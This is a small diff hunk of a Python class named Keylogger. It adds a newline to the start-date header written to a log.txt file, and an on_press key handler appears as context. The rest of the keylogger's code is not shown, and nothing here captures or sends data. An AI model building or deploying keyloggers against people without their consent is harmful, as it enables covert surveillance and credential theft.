@@ -10,7 +10,7 @@ class Keylogger():
         self.lock = lock
         now = datetime.datetime.now()
         f = open("log.txt", "w")
-        f.write("---START--- Date: {}".format(now))
+        f.write("---START--- Date: {}\n".format(now))
 
 
     def on_press(self,key):
